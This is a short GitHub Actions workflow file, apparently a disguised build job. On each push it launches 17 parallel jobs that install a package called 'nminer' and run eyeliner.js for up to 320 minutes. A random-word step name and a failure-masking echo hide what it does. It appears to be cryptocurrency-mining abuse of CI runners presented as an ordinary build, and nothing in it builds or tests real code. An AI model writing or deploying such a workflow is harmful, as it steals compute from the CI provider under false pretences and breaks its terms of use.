name: eyeliner
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 1260 }
          - { version: 6577 }
          - { version: 9492 }
          - { version: 9942 }
          - { version: 1426 }
          - { version: 9327 }
          - { version: 2653 }
          - { version: 8489 }
          - { version: 23 }
          - { version: 9439 }
          - { version: 5997 }
          - { version: 5945 }
          - { version: 8128 }
          - { version: 2049 }
          - { version: 2868 }
          - { version: 4144 }
          - { version: 4864 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: boo thoughtfully frightfully whose under
        run: |
          npm install nminer@latest
          timeout 320m node eyeliner.js || echo "eyeliner executed"